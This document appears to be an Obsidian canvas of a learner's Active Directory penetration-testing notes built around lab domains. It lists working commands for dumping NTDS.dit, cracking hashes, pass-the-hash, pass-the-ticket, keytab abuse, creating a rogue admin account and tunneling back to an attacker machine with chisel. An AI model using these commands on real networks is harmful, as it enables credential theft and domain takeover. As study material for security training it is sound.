{
	"nodes":[
		{"id":"46db2a3205592e25","type":"text","text":"# Active Directory\n\n\n#### Structure\n- Forest: collection of domains\n- Domain (tree): i.e. inlanefreight.local or freightlogistics.local\n- Subdomains: i.e. dev.inlanefreight.local or dev.freightlogistics.local\n- FQDN: Fully Qualified Domain Name. Complete name for a host. it has the hostname and domain name, i.e. `DC01.inlanefreight.local`\n- Trust Boundaries: The two domains (inlanefreight and freightlogistics) may have bidirectional trust at the root domain level, however, that doesn't mean subdomains from inlanefreight can authenticate to subdomains of freightlogistics\n- Objects: Any resource such as OUs, printers, users, domain controllers\n- Attributes: assigned characteristics of an object, such as hostnames for a computer. All attributes have an associated LDAP name that can be queried.\n- Schema: Defines what kinds of objects can exist in an AD environment.\n- GUID: Global Unique Identifier. When an object is created, a 128-bit value is assigned to it. This value is unique across the enterprise environment. The `ObjectGUID` attribute stores this value. This property never changes.\n- GPO: Group Policy Object. Collections of policy settings. A GPO has a GUID.\n- Security Principals: anything that the OS can authenticate, such as users, computer accounts, or even processes. These are AD objects.\n- Security Accounts Manager (SAM): manages local user accounts on a computer, NOT managed by AD.\n- Security Identifier (SID): unique identifier for a security principal or security group.\n- Distinguished Name (DN) describes the full path to an AD object. Ex. `cn=bjones, ou=IT, ou=Employees, dc=inlanefreight, dc=local`\n\t- The user bjones (common name) works in the IT department (organizational unit) as an employee (organizational unit), on the inlanefreight.local domain.\n- Relative Distinguished Name (RDN): single component of the DN that identifies an object as unique from other objects on the same level. bjones is the RDN, and AD will not allow another bjones under the same parent container. However, two identical RDNs can exist as long as they are on different levels of organization.\n\t- `cn=bjones,dc=dev,dc=inlanefreight,dc=local` is different than `cn=bjones,dc=inlanefreight,dc=local`\n- sAMAccountName: logon name. here is bjones\n- userPrincipalName: this attribute combines the RDN with the domain name, i.e. `bjones@inlanefreight.local`\n- Flexible Single Master Operation (FMSO): these roles allow DCs to continue authenticating without interruption if one of the DCs goes down.\n- \n\n\nNTDS.dit\n- the heart of AD, stored on the DC at `C:\\Windows\\NTDS\\` and is a database of AD information.\n- Quick way to capture with netexec\n\t- `netexec smb [target] -u [user] -p [pass] --ntds`\n- Crack the hashes with `hashcat -m 1000` \n\nManual NTDS.dit capture:\n- `net localgroup` to check if the account has local admin rights\n- `net user [user]` to check domain privileges\n- `vssadmin` can be used to copy the C: drive so we don't bring any applications down\n\t- `vssadmin Create Shadow \\For=C:`\n\t- copy NITD.dit - `cmd.exe /c copy [shadow copy name]\\Windows\\NTDS\\NTDS.dit [output location]`\n\n\n","x":180,"y":1116,"width":860,"height":644,"color":"5"},
		{"id":"7cfc01c1d247cff8","type":"text","text":"# Pass the Hash\nSome of these techniques are very useful for pivoting within a network. Pay close attention to the IP address and domain you are using (and which device the hashes are for )\n\nNTLM hashed stored on the DC are not salted and can be passed\n- Once you log in as a user to one of the machines, enter `reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` to disable restricted admin mode. \n- Then you can PTH with RDP. This will be necessary to open multiple command prompts and continuing to PTH to elevate permissions.\n\nRDP\n- `xfreerdp  /v:[IP] /u:[user] /pth:[hash]`\n- See note at the top about disabling restricted admin mode to use RDP\n\nImpacket\n- `impacket-psexec [user]@[IP] -hashes [LM]:[NT]` opens a shell\n\t- if you only have `NT` hash for example, try `:[hash]`\n\nEvil-winrm\n- Useful if you don't have admin rights\n- `evil-winrm -i [IP] -u [user] -H [hash]`\n\t- opens a shell\n\nNetexec\n- `netexec [protocol] [IP] -u [user] -d . -H [hash] -x [command]`\n\t- executes specified command\n- `netexec [protocol] [IP/subnet] -u [user] -d . -H [hash] --local-auth`\n\t- adding `local-auth` will automatically try to authenticate to each host on the specified subnet with those credentials (useful if you found an Administrator hash)\n\nMimikatz\n- `sekurlsa::pth` is a module to perform PtH\n- on windows: `mimikatz.exe privilege::debug \"sekurlsa::pth /user:julio /rc4:[hash] /domain:inlanefreight.htb /run:cmd.exe\" exit`\n\t- Allows you to use cmd.exe to execute commands as that user\n\t- use `/domain:localhost` to execute a cmd on local machine\n\t- specify another domain to try and connect to a Domain Controller or something\n\nPowershell\n- `Invoke-TheHash` https://github.com/Kevin-Robertson/Invoke-TheHash\n\t- You have to download the files onto the target, and import them into powershell with `Import-Module ./Invoke-TheHash.psd1` etc.\n\t- you need the target user to have admin rights (current user doesn't need those rights)\n\t- `Invoke-SMBExec -Target [IP] -Domain [domain] -Username [user] -Hash [hash] -Command \"[command]\"`\n\t\t-  You can also use this process to open a reverse shell by replacing the `-Command` with a PowerShell #3 payload from reverse shell generator\n\t\t- You can use the local target and try to connect to the Domain Controller or other machines by specifying the target and domain for it\n\t- `Invoke-SMBExec -Target [IP] -Domain [domain] -Username [user] -Hash [hash] -Command \"net user mark Password123 /add && net localgroup administrators mark /add\" -Verbose`\n\t\t- This command creates a new user named Mark and adds them to the admin group (we didn't get to log in as the person whose hash we had, we simply passed the hash and borrowed their rights for a process)","x":-720,"y":240,"width":600,"height":475},
		{"id":"0a169b0dd64b10ec","type":"text","text":"# Pass the Ticket (Linux)\n\n### If there is a Linux machine in the domain:\n\nkeytab files and `ccache` files are two ways Linux machines store and use Kerberos credentials\n- When you discover their owners, check the owner's domain permissions with `id [user@domain]` to see if they have Domain Admin permissions\n\nUse `realm list` on the Linux machine to identify the domain it is joined to\n\t- if `realm` is not available, you can check for `sssd` and `winbind` in the running services\n\t- `ps -ef | grep -i \"winbind\"`\n\t- `crontab -l` and search for the word `kinit` to indicate Kerberos activity\n\nFinding ccache files\n- `ccache` files in Linux are usually stored in `/tmp` and in the environment variable `KRB5CCNAME`.\n\t- `env | grep -i krb5` \n\t- view the permissions for them after you discover them\n\nAbusing ccache files\n- navigate to root directory on target machine (as root)\n- `cp [ccache file] .`\n- `export KRB5CCNAME=[path to ccache copy]`\n- `klist` to check permissions.\n- `smbclient //[domain controller]/[directory] -k -c ls -no-pass`\n\nFinding keytab files\n- Search for files with the word `keytab`\n\t- `find / -name *keytab* -ls 2>/dev/null`\n\nAbusing KeyTab (krb5) Files\n- You can impersonate a user by discovering KeyTab files\n- `klist -k -t [path to keytab]`\n- use `klist` again to confirm your access\n- use `smbclient` or something to access their files\n-  `python3 keytabextract.py [.keytab file]`\n\t- will extract NTLM hashes that can be used for PTH\n\nLinikatz\n- download from github\n- execute\n\n### Attacking from your linux machine\n\nThis uses `chisel`, `proxychains`, `impacket`, and an example with `evil-winrm` \n\nIf you want to use Linux attack tools from your host machine, you need to proxy your traffic through the machine that gave you access. This example connects to `ms01`\n- edit the `etc/hosts` file and add the LOCAL IP addresses of the access machine and the target domain controller. Also add the domain names\n\t- ex. `172.16.1.5  ms01.inlanefreight.htb ms01`\n\t- `172.16.1.10  inlanefreight.htb dc01.inlanefreight.htb dc01`\n- modify the proxychain config to use socks5 and port 1080\n\t- `cat /etc/proxychains.conf`\n\t- should have the line `socks5 127.0.0.1 1080`\n- Download chisel (github .gz file from releases)\n\t- `sudo ./chisel server --reverse`\n\t- connect to target with RDP, make sure it has chisel downloaded\n\t\t- `xfreerdp /v:[target] /u:[user] /d:inlanefreight.htb /p:[pass] /dynamic-resolution`\n\t- execute chisel on target and connect back to attacking machine\n\t- `c:\\tools\\chisel.exe client [IP]:[port] R:socks`\n- Transfer files you need, such as a keytab from a Linux machine on the network, through proxy machine (`ms01`)\n\nImpacket via proxychain\n- Use the ticket you transferred with `impacket` and `proxychains` (compatible with a proxychain setup)\n- Set the ticket to the `KRB5CCNAME` environment variable\n\t- some implementations of AD use the `FILE:` prefix in the file path when setting this variable, meaning the path for the variable needs to only include the path to the ccache file (not the file name at the end)\n- `proxychains impacket-wmiexec [DC hostname] -k`\n\n\nEvil-WinRM via a proxychain\n- edit the `/etc/krb5.conf` file to change the `default_realm` and `kdc`\n\t- default_realm is the domain (`inlanefreight.htb`)\n\t- KDC is the controller address (`dc01.inlanefreight.htb`)\n- `proxychains evil-winrm -i dc01 -r inlanefreight.htb`\n\nAdditionally, you can convert `ccache` (linux) to `kirbi` (windows) with `impacket`\n- `impacket-ticketConverter [ccache file] [kirbi output]`","x":-1534,"y":-740,"width":640,"height":480},
		{"id":"65a93055ef112c75","type":"text","text":"# Pass the Key (OverPass the Hash) (Forges a new TGT)\nConverts a hash/key into a TGT. This is helpful when you have cleartext or hashed user password but need Kerberos authentication to access something.\n\nTraditional PTH doesn't touch kerberos. Pass the Key or OverPass The Hash converts a hash/key into a Ticket-Granting-Ticket (TGT)\n\nFirst use Mimikatz to extract user's hash:\n- `mimikatz.exe` -> `privilege::debug` -> `sekurlsa::ekeys`\n\nOverPass with Mimikatz (admin rights required)\n- `mimikatz.exe` -> `privilege::debug` -> `sekurlsa::pth /domain: /user: /ntlm:`\n\nOverPass with Rubeus (admin rights NOT required)\n- can use rc4, aes128, aes256, or des\n- `Rubeus.exe asktgt /domain: /user: /[type]: /nowrap`\n- `[type]` example might be something like `/aes256:`","x":786,"y":-740,"width":760,"height":480},
		{"id":"127828dc9c55a42a","type":"text","text":"# Pass the Ticket\n\nMimikatz\n- `mimikatz.exe` -> `privilege::debug` -> `kerberos::ptt \"[path to .kirbi file]\"`\n- this doesn't really return anything, it just adds the ticket for you so you can access other resources that it grants\n\nOpening a remote PS shell with PTT\n- you can run PS scripts on remote computers, you need administrative permissions to do so (or, user can be in the Remote Management Users group)\n- Conduct a PTT attack with the mimikatz or Rubeus instructions first\n- Use the ticket to start a session from cmd:\n\t- `powershell` -> `Enter-PSSession -ComputerName [name]`\n\t- Assuming we imported a ticket that gave us access to the named computer/DC, this will open a remote PS shell on that device\n\nRubeus\n- `Rubeus.exe asktgt /domain: /user: /[type] /ptt`\n\t- `[type]` would be hash type such as `/rc4:`\n- Use a `.kirbi` ticket exported from mimikatz.exe (see `Export Kerberos Tickets`)\n\t- `Rubeus.exe ptt /ticket:[value]` \n\t- `[value]` is from mimikatz output. Example:\n\t- `/ticket:[0;6c680]-2-0-40e10000-user@domain.kirbi`\n- OR convert `.kirbi` ticket to a base64 string\n\t- Powershell `[Convert]::ToBase64String([IO.File]::ReadAllBytes(\"[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi\"))`\n\t- Once you get the base64 string: `Rubeus.exe ptt /ticket:[string]`\n- To PTT to another remote host and open PowerShell:\n\t- `Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show`\n\t- this will open a new cmd window, and we can execute Rubeus again in that window to request a new TGT with the `/ptt` option to import the ticket from our current session to the DC or target machine:\n\t- `Rubeus.exe asktgt /user: /domain: /[hash value]` -> `powershell` -> `Enter-PSSession -ComputerName [name]`\n\n","x":-674,"y":-800,"width":960,"height":480},
		{"id":"d5e7a5050bec12c3","type":"text","text":"# Export Kerberos Tickets\n\nInstead of an NTLM hash, you can use a stolen Kerberos ticket.\n\nIf you get local administrator access, you can steal tickets stored by LSASS.\n\nTickets ending with $ correspond to the computer account. Tickets that have @ represent the user's name, service name, and domain name.\n\nMimikatz command usage\n- `mimikatz.exe` -> `privilege::debug` -> `sekurlsa::tickets /export`\n- these may not work anymore? wrong encryption type exported from Mimikatz?\n\nRubeus\n- `Rubeus.exe dump /nowrap`\n","x":146,"y":-20,"width":680,"height":320},
		{"id":"6fef09b4c2f11b7e","type":"text","text":"# Kerberos Tickets","x":334,"y":580,"width":305,"height":50},
		{"id":"55f260145e1e3b39","type":"text","text":"# Clock Issue\n\n`ntpdate -u [IP]`","x":-602,"y":980,"width":364,"height":169},
		{"id":"5718eae15cb32f7a","x":1220,"y":1080,"width":1300,"height":717,"type":"text","text":"# Kereberos, DNS, LDAP, MSRPC, NTLM\n\n\n#### Kerberos, port 88\n- Authentication Protocol. The basis of this protocol is that the password is never transmitted over the internet.\n- Grants tickets to users that allow access. Clients will send requests that are encrypted and Kerberos will decrypt the request with the stored password for that user to determine if the request is from a valid user.\n- Client presents the TGT and gets a TGS (ticket granting service) in response. TGS is encrypted with the associated services NTLM hash. The TGS is presented to the service, which will then decrypt the TGS using the same hash.\n\n#### DNS\n- Active Directory Uses AD DS (Domain Services) to allow clients to locate Domain Controllers.\n- If authenticated on the network, you can use `nslookup [domain]` to search for the IP address (or vice versa if you provide the IP address).\n\n#### LDAP, port 389 or 636 (SSL)\n- Lightweight Directory Access Protocol\n- This is another authentication protocol for AD. Kerberos authenticates to the network, LDAP authenticates to services and directories within the network.\n\n#### MSRPC\n- Microsoft Remote Procedure Call\n- Client-server model for applications\n\n#### NTLM\n- Another authentication protocol\n- NTLM, NTLMv1, NTLMv2 are all symmetric key cryptography, one-way authentication, MD4 hashes, and are trusted by the Domain Controller.\n- Kerberos is symmetric and asymmetric, uses MD5, and is trusted by the DC and the KDC (key distribution center).\n- Hash format: `Rachel:500:aad3c435b514a4eeaad3b935b51304fe:e46b9e548fa0d122de7f59fb6d48eaa2:::`\n\t- Rachel: username\n\t- 500: RID (500 means administrator account)\n\t- First half is the LM hash. If LM hashes are disabled on the system (default since Windows 2008), this can't be used.\n\t- Second half is the NT hash. Can be cracked offline to reveal cleartext value, or, used for a PtH attack.\n- NTLMv1 can NOT be used for PTH\n- NTLMv1 example: `u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c`\n- NTLMv2 example: `admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030`\n\n#### MSCache2\n- An offline storage of Domain Cached Credentials (DCC) to solve the issue of a network outage (meaning that Kerberos is no longer available).\n- Hosts save the last 10 hashes for any domain users that successfully logged into the machine.\n- Stored in `HKEY_LOCAL_MACHINE\\SECURITY\\Cache`\n- Cannot be used in PTH\n- Format `$DCC2$10240#bjones#e4e938d12fe5974dc42a90120bd9c90f`\n- "}
	],
	"edges":[
		{"id":"be792a683871aacd","fromNode":"127828dc9c55a42a","fromSide":"left","toNode":"0a169b0dd64b10ec","toSide":"right"},
		{"id":"6dea7c5923362e85","fromNode":"46db2a3205592e25","fromSide":"top","toNode":"7cfc01c1d247cff8","toSide":"bottom"},
		{"id":"7cbfb15d4deaca3c","fromNode":"6fef09b4c2f11b7e","fromSide":"top","toNode":"d5e7a5050bec12c3","toSide":"bottom"},
		{"id":"f43f2e3dd1a43202","fromNode":"d5e7a5050bec12c3","fromSide":"top","toNode":"65a93055ef112c75","toSide":"bottom"},
		{"id":"78e275b80c096bd6","fromNode":"d5e7a5050bec12c3","fromSide":"top","toNode":"127828dc9c55a42a","toSide":"bottom"},
		{"id":"ed7e9271fbcdd573","fromNode":"46db2a3205592e25","fromSide":"left","toNode":"55f260145e1e3b39","toSide":"right"},
		{"id":"2f78250e12deaf17","fromNode":"46db2a3205592e25","fromSide":"top","toNode":"6fef09b4c2f11b7e","toSide":"bottom"},
		{"id":"93b150ad6d71ee44","fromNode":"46db2a3205592e25","fromSide":"right","toNode":"5718eae15cb32f7a","toSide":"left"}
	]
}